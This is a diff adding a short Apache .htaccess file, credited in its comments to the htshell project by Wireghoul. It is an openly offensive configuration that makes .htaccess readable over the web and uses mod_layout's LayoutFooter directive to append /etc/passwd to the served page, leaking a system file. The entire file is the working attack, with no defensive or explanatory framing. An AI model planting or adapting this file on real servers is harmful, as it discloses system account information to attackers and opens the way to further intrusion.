@@ -1,0 +1,14 @@
+# Self contained .htaccess directory traversal attack - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+# This attack will dump /etc/password
+# Override default deny rule to make .htaccess file accessible over web
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+# Enable mod_layout for .htaccess files
+AddOutputFilter LAYOUT .htaccess
+
+# Append the file we want below:
+LayoutFooter /etc/passwd
+##### BEGIN /etc/passwd ###########
